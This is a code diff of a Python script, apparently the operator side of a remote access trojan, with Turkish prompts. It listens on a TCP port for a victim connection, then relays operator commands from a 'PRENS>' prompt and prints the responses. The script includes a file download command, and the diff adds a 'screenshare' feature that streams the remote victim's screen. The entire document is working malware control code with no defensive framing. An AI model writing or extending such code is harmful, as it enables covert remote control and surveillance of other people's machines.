@@ -2,7 +2,7 @@ import socket
 from colorama import Fore,Back,Style,init
 init()
 
-port=int(input("lütfen bağlanmka istedğiinz port:"))
+port=int(input("lütfen bağlanmak  istedğiinz port:"))
 baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 baglantı.bind(("0.0.0.0",port))
 print("sunucu dinleniyor........")
@@ -12,6 +12,17 @@ print(conn,addr)
 
 while True:
     emir=input(Fore.RED+"PRENS>"+Fore.RESET)
+    
+
+
+    if emir=="screenshare":
+        try:
+            from vidstream import StreamingServer
+            screen=StreamingServer("0.0.0.0",9090)
+            screen.start_server()
+        except Exception as e:
+            print(e)
+
 
     if emir.startswith("download"):
         try:
@@ -32,10 +43,19 @@ while True:
             continue
         except Exception as e:
             print(e)
-
-
+  
+   
     conn.send(emir.encode("utf-8"))
     response=conn.recv(16384).decode("utf-8")
+    
+    if response=="yayın durduruldu":
+        try:
+            screen.stop_server()
+            print(response)
+        except Exception as e:
+            print(e)
+            
+
     print(response)
 
 
